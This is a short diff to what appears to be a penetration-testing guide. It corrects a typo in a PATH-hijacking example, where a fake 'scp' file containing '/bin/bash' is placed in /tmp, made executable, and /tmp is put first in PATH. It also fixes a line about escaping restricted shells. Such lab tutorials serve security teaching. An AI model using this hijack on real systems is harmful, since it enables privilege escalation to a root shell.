@@ -18,7 +18,7 @@ Then, we can set the $PATH to include path to our folder which cotains malicous 
 ```
 bob@victimlab:~/#: cd /tmp
 bob@victimlab:~/#: echo "/bin/bash" > scp
-bob@victimlab:~/#: chmod 777 ps
+bob@victimlab:~/#: chmod 777 scp
 bob@victimlab:~/#: echo $PATH
 bob@victimlab:~/#: export PATH=/tmp:$PATH
 ```
@@ -33,7 +33,7 @@ root@kali:~/#: export PATH=.:$PATH
 
 ## Missing binaries
 
-In some restricted shell we may not able use common binaris such as "cd", "sh" etc.
+In some restricted shells we may not able use common binaris such as "cd", "sh" etc.
 So we'll use export path to load all available binaries:
 
 ```
